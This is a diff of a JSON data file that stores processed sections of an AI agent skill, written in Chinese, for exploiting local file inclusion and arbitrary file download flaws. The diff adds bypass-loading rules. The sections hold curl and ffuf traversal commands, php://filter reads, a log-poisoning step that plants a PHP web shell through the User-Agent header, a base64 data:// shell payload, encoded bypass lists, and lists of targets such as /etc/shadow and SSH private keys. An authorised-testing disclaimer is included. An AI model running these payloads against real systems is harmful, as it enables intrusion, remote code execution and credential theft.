@@ -9454,12 +9454,12 @@
       "deduplicated_reference_paths": [
         "references/bypass_techniques.md"
       ],
-      "original_body_tokens": 1943,
-      "original_description_tokens": 30,
-      "reduced_body": "**本 Skill 仅用于授权安全测试。使用前请确保：**\n- 获得目标系统所有者的明确书面授权\n- 测试范围和授权内容已明确定义\n- 遵守当地法律法规\n\n**未经授权的渗透测试是非法行为。**\n\n本 Skill 专注于**任意文件下载**和**本地文件包含 (LFI)** 类型漏洞的检测与利用。\n\n**注意**：很多端点实际上是**LFI 模式**（参数值被当作文件名包含执行），而非真正的文件下载。因此本 Skill 的核心是**LFI/文件读取能力**。\n\n自动识别以下 LFI 特征：\n\n- **文件包含模式**：参数值被直接用作 `include()` 或`require()` 的文件路径\n- **目录遍历模式**：`../` 序列用于遍历目录\n- **伪协议利用**：`php://filter`、`php://input` 等\n- **路径长度限制**：超长路径可能被截断\n- **特殊字符**：`%00` 空字节可能绕过扩展名检查\n\n- **源码读取**：读取 PHP 源码进行分析\n- **配置获取**：读取数据库配置文件\n- **日志投毒**：通过 LFI 写入日志获取 RCE\n- **图片马**：配合文件上传 getshell\n\nURL=\"$1\"\nPARAM=\"$2\"\nMAX_DEPTH=${3:-10}\n\n如果主要工具不可用，可以使用以下替代方案：\n\n- **技术文档**: `references/lfi_techniques.md` - LFI 完整技术详解\n- **PHP 伪协议**: `references/php_wrappers.md` - PHP wrapper 参考\n- **绕过技术**: `references/bypass_techniques.md` - 编码和过滤绕过\n- **RCE 方法**: `references/rce_methods.md` - 远程代码执行汇总\n\n发现 LFI 漏洞后，可以存储到数据库：\n\n**数据库位置**: `./data/results.db`\n\n**相关技能**: `results-storage` - 查询数据、生成报告\n\n**最后更新**: 2026-03-05\n**版本**: 2.0",
-      "reduced_body_tokens": 237,
-      "reduced_description": "任意文件下载与本地文件包含 (LFI) 漏洞检测和利用工具。使用 curl、ffuf、wget 等工具测试文件下载漏洞，支持路径遍历、伪协议利用、敏感文件读取。当用户需要测试文件下载功能、检测 LFI 漏洞、读取服务器敏感文件时使用此技能。 **本 Skill 仅用于授权安全测试。使用前请确保：**\n- 获得目标系统所有者的明确书面授权\n- 测试范围和授权内容已明确定义\n- 遵守当地法律法规 **未经授权的渗透测试是非法行为。** 本 Skill 专注于**任意文件下载**和**本地文件包含 (LFI)** 类型漏洞的检测与利用。 **注意**：很多端点实际上是**LFI 模式**（参数值被当作文件名包含执行），而非真正的文件下载。因此本 Skill 的核心是**LFI/文件读取能力**。",
-      "reduced_description_tokens": 88,
+      "original_body_tokens": 2009,
+      "original_description_tokens": 42,
+      "reduced_body": "**本 Skill 仅用于授权安全测试。使用前请确保：**\n- 获得目标系统所有者的明确书面授权\n- 测试范围和授权内容已明确定义\n- 遵守当地法律法规\n\n**未经授权的渗透测试是非法行为。**\n\n本 Skill 专注于**任意文件下载**和**本地文件包含 (LFI)** 类型漏洞的检测与利用。\n\n**注意**：很多端点实际上是**LFI 模式**（参数值被当作文件名包含执行），而非真正的文件下载。因此本 Skill 的核心是**LFI/文件读取能力**。\n\n- 当基础 `../`、绝对路径或 `php://filter` 测试被过滤时，再读取 `references/bypass_techniques.md` 获取编码、双写和其他绕过变体。\n- 当你已经确认存在文件读取能力，或需要快速枚举 Linux / Windows 高价值目标时，再读取 `references/sensitive_files.md`。\n\n自动识别以下 LFI 特征：\n\n- **文件包含模式**：参数值被直接用作 `include()` 或`require()` 的文件路径\n- **目录遍历模式**：`../` 序列用于遍历目录\n- **伪协议利用**：`php://filter`、`php://input` 等\n- **路径长度限制**：超长路径可能被截断\n- **特殊字符**：`%00` 空字节可能绕过扩展名检查\n\n- **源码读取**：读取 PHP 源码进行分析\n- **配置获取**：读取数据库配置文件\n- **日志投毒**：通过 LFI 写入日志获取 RCE\n- **图片马**：配合文件上传 getshell\n- **敏感文件清单**：需要 Linux/Windows 目标文件列表时读取 `references/sensitive_files.md`\n\nURL=\"$1\"\nPARAM=\"$2\"\nMAX_DEPTH=${3:-10}\n\n如果主要工具不可用，可以使用以下替代方案：\n\n- **技术文档**: `references/lfi_techniques.md` - LFI 完整技术详解\n- **PHP 伪协议**: `references/php_wrappers.md` - PHP wrapper 参考\n- **绕过技术**: `references/bypass_techniques.md` - 编码和过滤绕过\n- **RCE 方法**: `references/rce_methods.md` - 远程代码执行汇总\n\n发现 LFI 漏洞后，可以存储到数据库：\n\n**数据库位置**: `./data/results.db`\n\n**相关技能**: `results-storage` - 查询数据、生成报告\n\n**最后更新**: 2026-03-05\n**版本**: 2.0",
+      "reduced_body_tokens": 300,
+      "reduced_description": "任意文件下载与本地文件包含 (LFI) 漏洞检测和利用工具。使用 curl、ffuf、wget 等工具测试文件下载漏洞，支持路径遍历、双重编码绕过、伪协议利用、敏感文件读取。尤其适用于下载接口、LFI、/etc/passwd、/proc/self/environ、win.ini、php://filter 这类文件读取与遍历场景。 **本 Skill 仅用于授权安全测试。使用前请确保：**\n- 获得目标系统所有者的明确书面授权\n- 测试范围和授权内容已明确定义\n- 遵守当地法律法规 **未经授权的渗透测试是非法行为。** 本 Skill 专注于**任意文件下载**和**本地文件包含 (LFI)** 类型漏洞的检测与利用。 **注意**：很多端点实际上是**LFI 模式**（参数值被当作文件名包含执行），而非真正的文件下载。因此本 Skill 的核心是**LFI/文件读取能力**。",
+      "reduced_description_tokens": 99,
       "restored_snippets": [],
       "sections": [
         {
@@ -9511,573 +9511,585 @@
           "text": "**注意**：很多端点实际上是**LFI 模式**（参数值被当作文件名包含执行），而非真正的文件下载。因此本 Skill 的核心是**LFI/文件读取能力**。"
         },
         {
+          "classification": "background",
+          "duplicate_of": null,
+          "source_index": 8,
+          "text": "## 渐进加载规则"
+        },
+        {
+          "classification": "core_rule",
+          "duplicate_of": null,
+          "source_index": 9,
+          "text": "- 当基础 `../`、绝对路径或 `php://filter` 测试被过滤时，再读取 `references/bypass_techniques.md` 获取编码、双写和其他绕过变体。\n- 当你已经确认存在文件读取能力，或需要快速枚举 Linux / Windows 高价值目标时，再读取 `references/sensitive_files.md`。"
+        },
+        {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 8,
+          "source_index": 10,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 9,
+          "source_index": 11,
           "text": "## 核心功能"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 10,
+          "source_index": 12,
           "text": "### 1. LFI 漏洞检测"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 11,
+          "source_index": 13,
           "text": "自动识别以下 LFI 特征："
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 12,
+          "source_index": 14,
           "text": "- **文件包含模式**：参数值被直接用作 `include()` 或`require()` 的文件路径\n- **目录遍历模式**：`../` 序列用于遍历目录\n- **伪协议利用**：`php://filter`、`php://input` 等\n- **路径长度限制**：超长路径可能被截断\n- **特殊字符**：`%00` 空字节可能绕过扩展名检查"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 13,
+          "source_index": 15,
           "text": "### 2. 常见 LFI Payload"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 14,
+          "source_index": 16,
           "text": "| 类型 | Payload | 适用场景 |\n|------|------|--------|\n| **文件包含** | `?title=index.php` | 简单文件包含测试 |\n| **路径遍历** | `?title=../../../../etc/passwd` | Linux 目录遍历 |\n| **伪协议** | `?title=php://filter/convert.base64-encode/resource=/etc/passwd` | 读取敏感文件源码 |\n| **Windows 路径** | `?title=C:\\\\Windows\\\\win.ini` | Windows 文件读取 |\n| **URL 编码** | `?title=%2e%2e%2f%2e%2e%2fetc/passwd` | 绕过简单过滤 |"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 15,
+          "source_index": 17,
           "text": "### 3. LFI 利用场景"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 16,
-          "text": "- **源码读取**：读取 PHP 源码进行分析\n- **配置获取**：读取数据库配置文件\n- **日志投毒**：通过 LFI 写入日志获取 RCE\n- **图片马**：配合文件上传 getshell"
+          "source_index": 18,
+          "text": "- **源码读取**：读取 PHP 源码进行分析\n- **配置获取**：读取数据库配置文件\n- **日志投毒**：通过 LFI 写入日志获取 RCE\n- **图片马**：配合文件上传 getshell\n- **敏感文件清单**：需要 Linux/Windows 目标文件列表时读取 `references/sensitive_files.md`"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 17,
+          "source_index": 19,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 18,
+          "source_index": 20,
           "text": "## 工具安装"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 19,
+          "source_index": 21,
           "text": "### 必备工具"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 20,
+          "source_index": 22,
           "text": "```bash\n# curl - HTTP 请求工具（通常已预装）\n# macOS\nbrew install curl"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 21,
+          "source_index": 23,
           "text": "# Ubuntu/Debian\napt-get install curl"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 22,
+          "source_index": 24,
           "text": "# ffuf - 快速 Web 模糊测试工具\ngo install github.com/ffuf/ffuf@latest"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 23,
+          "source_index": 25,
           "text": "# wget - 文件下载工具（通常已预装）\n# macOS\nbrew install wget"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 24,
+          "source_index": 26,
           "text": "# Ubuntu/Debian\napt-get install wget\n```"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 25,
+          "source_index": 27,
           "text": "### 可选工具"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 26,
+          "source_index": 28,
           "text": "```bash\n# dirsearch - 目录扫描工具\ngit clone https://github.com/maurosoria/dirsearch.git\ncd dirsearch && pip install -r requirements.txt"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 27,
+          "source_index": 29,
           "text": "# feroxbuster - 快速目录枚举工具\ncurl -L https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash\n```"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 28,
+          "source_index": 30,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 29,
+          "source_index": 31,
           "text": "## 使用方式"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 30,
+          "source_index": 32,
           "text": "### 快速开始"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 31,
+          "source_index": 33,
           "text": "```bash\n# 测试 LFI - 简单文件包含\ncurl -s \"https://target.com/vul/page.php?file=../../../../etc/passwd\""
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 32,
+          "source_index": 34,
           "text": "# 测试伪协议读取\ncurl -s \"https://target.com/vul/page.php?file=php://filter/convert.base64-encode/resource=index.php\""
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 33,
+          "source_index": 35,
           "text": "# 使用 ffuf 批量测试 LFI payload\nffuf -u \"https://target.com/vul/page.php?file=FUZZ\" -w lfi_payloads.txt -mc 200\n```"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 34,
+          "source_index": 36,
           "text": "### 场景 1: 基础路径遍历测试"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 35,
+          "source_index": 37,
           "text": "```bash\n# 测试 1-6 层遍历深度\ncurl \"https://target.com/vul.php?file=../etc/passwd\"\ncurl \"https://target.com/vul.php?file=../../etc/passwd\"\ncurl \"https://target.com/vul.php?file=../../../etc/passwd\"\ncurl \"https://target.com/vul.php?file=../../../../etc/passwd\"\ncurl \"https://target.com/vul.php?file=../../../../../etc/passwd\"\ncurl \"https://target.com/vul.php?file=../../../../../../etc/passwd\""
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 36,
+          "source_index": 38,
           "text": "# 使用 ffuf 自动化测试\nffuf -u \"https://target.com/vul.php?file=FUZZetc/passwd\" \\\n     -w <(seq 1 10 | sed 's/^/\\.\\.\\//') \\\n     -mc 200 \\\n     -mr \"root:x:0:0\"\n```"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 37,
+          "source_index": 39,
           "text": "### 场景 2: 伪协议利用"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 38,
+          "source_index": 40,
           "text": "```bash\n# 读取/etc/passwd\ncurl -s \"https://target.com/vul.php?file=php://filter/convert.base64-encode/resource=/etc/passwd\" | base64 -d"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 39,
+          "source_index": 41,
           "text": "# 读取 PHP 源码（避免代码执行）\ncurl -s \"https://target.com/vul.php?file=php://filter/read=convert.base64-encode/resource=config.php\" | base64 -d"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 40,
+          "source_index": 42,
           "text": "# 使用不同过滤器\ncurl \"https://target.com/vul.php?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php\"\n```"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 41,
+          "source_index": 43,
           "text": "### 场景 3: 日志投毒 RCE"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 42,
+          "source_index": 44,
           "text": "```bash\n# 步骤 1: 在 User-Agent 中注入 PHP 代码\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" \"https://target.com/page.php\""
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 43,
+          "source_index": 45,
           "text": "# 步骤 2: 包含日志文件执行代码\ncurl \"https://target.com/page.php?file=/var/log/apache2/access.log&cmd=whoami\""
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 44,
+          "source_index": 46,
           "text": "# 测试不同日志位置\ncurl \"https://target.com/page.php?file=/var/log/apache2/error.log&cmd=id\"\ncurl \"https://target.com/page.php?file=/var/log/nginx/access.log&cmd=uname -a\"\n```"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 45,
+          "source_index": 47,
           "text": "### 场景 4: 批量文件下载测试"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 46,
+          "source_index": 48,
           "text": "```bash\n# 使用 ffuf 测试常见敏感文件\nffuf -u \"https://target.com/download.php?file=FUZZ\" \\\n     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n     -mc 200 \\\n     -t 50 \\\n     -o lfi_results.txt"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 47,
+          "source_index": 49,
           "text": "# 使用 wget 批量下载\nwhile read path; do\n    wget -q \"https://target.com/download.php?file=$path\" -O \"downloaded_$(echo $path | md5sum | cut -c1-8).txt\"\ndone < lfi_payloads.txt\n```"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 48,
+          "source_index": 50,
           "text": "### 场景 5: 绕过技术测试"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 49,
+          "source_index": 51,
           "text": "```bash\n# URL 编码绕过\ncurl \"https://target.com/vul.php?file=%2e%2e%2f%2e%2e%2fetc/passwd\""
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 50,
+          "source_index": 52,
           "text": "# 双重 URL 编码\ncurl \"https://target.com/vul.php?file=%252e%252e%252fetc/passwd\""
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 51,
+          "source_index": 53,
           "text": "# 空字节截断（PHP<5.3.4）\ncurl \"https://target.com/vul.php?file=../../etc/passwd%00.jpg\""
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 52,
+          "source_index": 54,
           "text": "# 路径变体\ncurl \"https://target.com/vul.php?file=....//....//etc/passwd\"\ncurl \"https://target.com/vul.php?file=..\\\\..\\\\..\\\\etc\\\\passwd\"\n```"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 53,
-          "text": "---"
-        },
-        {
-          "classification": "background",
-          "duplicate_of": null,
-          "source_index": 54,
-          "text": "## 工具选择指南"
-        },
-        {
-          "classification": "example",
-          "duplicate_of": null,
           "source_index": 55,
-          "text": "| 场景 | 推荐工具 | 命令示例 |\n|------|----------|----------|\n| 快速单点测试 | curl | `curl \"URL?file=../etc/passwd\"` |\n| 批量 Payload 测试 | ffuf | `ffuf -u URL -w payloads.txt` |\n| 文件下载保存 | wget | `wget -O output.txt \"URL\"` |\n| 目录深度枚举 | 自定义脚本 | 见下方深度测试脚本 |\n| 响应内容分析 | grep/diff | `grep -i \"root:x:0\" response.txt` |"
+          "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
           "source_index": 56,
-          "text": "### 深度测试脚本"
+          "text": "## 工具选择指南"
         },
         {
           "classification": "example",
           "duplicate_of": null,
           "source_index": 57,
-          "text": "```bash\n#!/bin/bash\n# lfi_depth_test.sh - 测试路径遍历深度"
+          "text": "| 场景 | 推荐工具 | 命令示例 |\n|------|----------|----------|\n| 快速单点测试 | curl | `curl \"URL?file=../etc/passwd\"` |\n| 批量 Payload 测试 | ffuf | `ffuf -u URL -w payloads.txt` |\n| 文件下载保存 | wget | `wget -O output.txt \"URL\"` |\n| 目录深度枚举 | 自定义脚本 | 见下方深度测试脚本 |\n| 响应内容分析 | grep/diff | `grep -i \"root:x:0\" response.txt` |"
         },
         {
-          "classification": "core_rule",
+          "classification": "background",
           "duplicate_of": null,
           "source_index": 58,
-          "text": "URL=\"$1\"\nPARAM=\"$2\"\nMAX_DEPTH=${3:-10}"
+          "text": "### 深度测试脚本"
         },
         {
           "classification": "example",
           "duplicate_of": null,
           "source_index": 59,
+          "text": "```bash\n#!/bin/bash\n# lfi_depth_test.sh - 测试路径遍历深度"
+        },
+        {
+          "classification": "core_rule",
+          "duplicate_of": null,
+          "source_index": 60,
+          "text": "URL=\"$1\"\nPARAM=\"$2\"\nMAX_DEPTH=${3:-10}"
+        },
+        {
+          "classification": "example",
+          "duplicate_of": null,
+          "source_index": 61,
           "text": "for i in $(seq 1 $MAX_DEPTH); do\n    payload=$(printf '../%.0s' $(seq 1 $i))\n    response=$(curl -s \"${URL}?${PARAM}=${payload}etc/passwd\")"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 60,
+          "source_index": 62,
           "text": "if echo \"$response\" | grep -q \"root:x:0:0\"; then\n        echo \"[+] 成功！深度：$i\"\n        echo \"$response\"\n        break\n    fi\n    echo \"[-] 深度 $i: 未匹配\"\ndone\n```"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 61,
+          "source_index": 63,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 62,
+          "source_index": 64,
           "text": "## 敏感文件路径清单"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 63,
+          "source_index": 65,
           "text": "### Linux 系统"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 64,
+          "source_index": 66,
           "text": "```bash\n# 系统用户信息\n/etc/passwd\n/etc/shadow        # 需要 root 权限\n/etc/group\n/etc/sudoers"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 65,
+          "source_index": 67,
           "text": "# 系统配置\n/etc/hosts\n/etc/resolv.conf\n/proc/version\n/proc/self/environ"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 66,
+          "source_index": 68,
           "text": "# Web 应用配置\n/var/www/html/.env\n/var/www/html/wp-config.php\n/var/www/html/config/database.yml\n/root/.ssh/id_rsa\n/home/*/.ssh/id_rsa"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 67,
+          "source_index": 69,
           "text": "# 日志文件\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/syslog\n```"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 68,
+          "source_index": 70,
           "text": "### Windows 系统"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 69,
+          "source_index": 71,
           "text": "```bash\n# 系统配置\nC:\\Windows\\win.ini\nC:\\Windows\\System.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 70,
+          "source_index": 72,
           "text": "# Web 配置\nC:\\inetpub\\wwwroot\\web.config\nC:\\xampp\\htdocs\\phpMyAdmin\\config.inc.php"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 71,
+          "source_index": 73,
           "text": "# IIS 日志\nC:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log\n```"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 72,
-          "text": "---"
-        },
-        {
-          "classification": "example",
-          "duplicate_of": null,
-          "source_index": 73,
-          "text": "## LFI Payload 清单"
-        },
-        {
-          "classification": "example",
-          "duplicate_of": null,
           "source_index": 74,
-          "text": "### 基础 Payload"
+          "text": "---"
         },
         {
           "classification": "example",
           "duplicate_of": null,
           "source_index": 75,
-          "text": "```\n../\n../..\n../../\n../../../\n../../../../\n../../../../../\n../../../../../../\n../../../../../../../\n../../../../../../../../\n..../\n....//\n..././\n..\\\n..\\/\n```"
+          "text": "## LFI Payload 清单"
         },
         {
           "classification": "example",
           "duplicate_of": null,
           "source_index": 76,
-          "text": "### 编码 Payload"
+          "text": "### 基础 Payload"
         },
         {
           "classification": "example",
           "duplicate_of": null,
           "source_index": 77,
-          "text": "```\n%2e%2e%2f\n%2e%2e/\n..%2f\n%2e%2e%5c\n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%c0%ae%c0%ae/\n..%c0%af\n..%255c\n```"
+          "text": "```\n../\n../..\n../../\n../../../\n../../../../\n../../../../../\n../../../../../../\n../../../../../../../\n../../../../../../../../\n..../\n....//\n..././\n..\\\n..\\/\n```"
         },
         {
-          "classification": "background",
+          "classification": "example",
           "duplicate_of": null,
           "source_index": 78,
-          "text": "### PHP 伪协议"
+          "text": "### 编码 Payload"
         },
         {
           "classification": "example",
           "duplicate_of": null,
           "source_index": 79,
+          "text": "```\n%2e%2e%2f\n%2e%2e/\n..%2f\n%2e%2e%5c\n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%c0%ae%c0%ae/\n..%c0%af\n..%255c\n```"
+        },
+        {
+          "classification": "background",
+          "duplicate_of": null,
+          "source_index": 80,
+          "text": "### PHP 伪协议"
+        },
+        {
+          "classification": "example",
+          "duplicate_of": null,
+          "source_index": 81,
           "text": "```\nphp://filter/convert.base64-encode/resource=/etc/passwd\nphp://filter/read=string.rot13/resource=index.php\nphp://input\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=\nexpect://id\nzip://shell.jpg%23shell.php\n```"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 80,
-          "text": "---"
-        },
-        {
-          "classification": "background",
-          "duplicate_of": null,
-          "source_index": 81,
-          "text": "## 测试清单"
-        },
-        {
-          "classification": "background",
-          "duplicate_of": null,
           "source_index": 82,
-          "text": "### 侦察阶段\n- [ ] 识别所有可能存在 LFI 的参数（file, page, title, include, path, document）\n- [ ] 测试基础路径遍历（../）\n- [ ] 确认目标操作系统（Linux/Windows）\n- [ ] 测试伪协议可用性（php://filter）"
+          "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
           "source_index": 83,
-          "text": "### 利用阶段\n- [ ] 读取系统敏感文件（/etc/passwd, /etc/shadow）\n- [ ] 读取 Web 应用配置文件（.env, config.php）\n- [ ] 读取 PHP 源码分析应用逻辑\n- [ ] 尝试日志投毒获取 RCE\n- [ ] 尝试/proc/self/environ 利用"
+          "text": "## 测试清单"
         },
         {
           "classification": "background",
           "duplicate_of": null,
           "source_index": 84,
-          "text": "### 绕过测试\n- [ ] URL 编码绕过（%2e%2e%2f）\n- [ ] 双重 URL 编码（%252e%252e%252f）\n- [ ] Unicode 混淆（%c0%ae%c0%ae%c0%af）\n- [ ] 路径变体（..\\, ..//, ..././）\n- [ ] 空字节截断（%00）\n- [ ] 扩展名绕过（file.php.jpg, file.php.）"
+          "text": "### 侦察阶段\n- [ ] 识别所有可能存在 LFI 的参数（file, page, title, include, path, document）\n- [ ] 测试基础路径遍历（../）\n- [ ] 确认目标操作系统（Linux/Windows）\n- [ ] 测试伪协议可用性（php://filter）"
         },
         {
-          "classification": "redundant",
-          "duplicate_of": "references/bypass_techniques.md",
+          "classification": "background",
+          "duplicate_of": null,
           "source_index": 85,
-          "text": "---"
+          "text": "### 利用阶段\n- [ ] 读取系统敏感文件（/etc/passwd, /etc/shadow）\n- [ ] 读取 Web 应用配置文件（.env, config.php）\n- [ ] 读取 PHP 源码分析应用逻辑\n- [ ] 尝试日志投毒获取 RCE\n- [ ] 尝试/proc/self/environ 利用"
         },
         {
           "classification": "background",
           "duplicate_of": null,
           "source_index": 86,
+          "text": "### 绕过测试\n- [ ] URL 编码绕过（%2e%2e%2f）\n- [ ] 双重 URL 编码（%252e%252e%252f）\n- [ ] Unicode 混淆（%c0%ae%c0%ae%c0%af）\n- [ ] 路径变体（..\\, ..//, ..././）\n- [ ] 空字节截断（%00）\n- [ ] 扩展名绕过（file.php.jpg, file.php.）"
+        },
+        {
+          "classification": "redundant",
+          "duplicate_of": "references/bypass_techniques.md",
+          "source_index": 87,
+          "text": "---"
+        },
+        {
+          "classification": "background",
+          "duplicate_of": null,
+          "source_index": 88,
           "text": "## 替代方案"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 87,
+          "source_index": 89,
           "text": "如果主要工具不可用，可以使用以下替代方案："
         },
         {
           "classification": "template",
           "duplicate_of": null,
-          "source_index": 88,
+          "source_index": 90,
           "text": "| 主要工具 | 替代方案 | 说明 |\n|----------|----------|------|\n| curl | wget | `wget -qO- \"URL\"` 等同于`curl -s \"URL\"` |\n| ffuf | gobuster | `gobuster dir -u URL -w payloads.txt` |\n| ffuf | dirsearch | `dirsearch -u URL -e php` |\n| curl + grep | httpx + nuclei | 使用 nuclei LFI 模板 |"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 89,
+          "source_index": 91,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 90,
+          "source_index": 92,
           "text": "## 相关 Resources"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 91,
+          "source_index": 93,
           "text": "- **技术文档**: `references/lfi_techniques.md` - LFI 完整技术详解\n- **PHP 伪协议**: `references/php_wrappers.md` - PHP wrapper 参考\n- **绕过技术**: `references/bypass_techniques.md` - 编码和过滤绕过\n- **RCE 方法**: `references/rce_methods.md` - 远程代码执行汇总"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 92,
+          "source_index": 94,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 93,
+          "source_index": 95,
           "text": "## 与 results-storage 集成"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 94,
+          "source_index": 96,
           "text": "发现 LFI 漏洞后，可以存储到数据库："
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 95,
+          "source_index": 97,
           "text": "```bash\npython .claude/skills/exploit-lfi/scripts/lfi_storage.py \\\n  --host-ip 192.168.1.100 \\\n  --url \"https://example.com/download?file=../../etc/passwd\" \\\n  --payload \"../../etc/passwd\" \\\n  --file-read \"root:x:0:0:root:/root:/bin/bash\" \\\n  --severity Critical \\\n  --subsystem \"Web Application\"\n```"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 96,
+          "source_index": 98,
           "text": "**数据库位置**: `./data/results.db`"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 97,
+          "source_index": 99,
           "text": "**相关技能**: `results-storage` - 查询数据、生成报告"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 98,
+          "source_index": 100,
           "text": "---"
         },
         {
           "classification": "background",
           "duplicate_of": null,
-          "source_index": 99,
+          "source_index": 101,
           "text": "## 最佳实践"
         },
         {
           "classification": "example",
           "duplicate_of": null,
-          "source_index": 100,
+          "source_index": 102,
           "text": "1. **始终编码 Payload** - 使用 URL 编码避免被 WAF 拦截\n2. **从浅到深测试** - 先测试 1-2 层遍历，再逐步加深\n3. **记录响应长度** - 成功响应通常长度异常\n4. **使用 base64** - 读取源码时用 base64 避免代码执行\n5. **不要忽略 403/404** - 有些 WAF 返回假错误码"
         },
         {
           "classification": "redundant",
           "duplicate_of": "references/bypass_techniques.md",
-          "source_index": 101,
+          "source_index": 103,
           "text": "---"
         },
         {
           "classification": "core_rule",
           "duplicate_of": null,
-          "source_index": 102,
+          "source_index": 104,
           "text": "**最后更新**: 2026-03-05\n**版本**: 2.0"
         }
       ],
@@ -42901,10 +42913,10 @@
     {
       "deduplicated_reference_paths": [],
       "original_body_tokens": 2083,
-      "original_description_tokens": 65,
+      "original_description_tokens": 79,
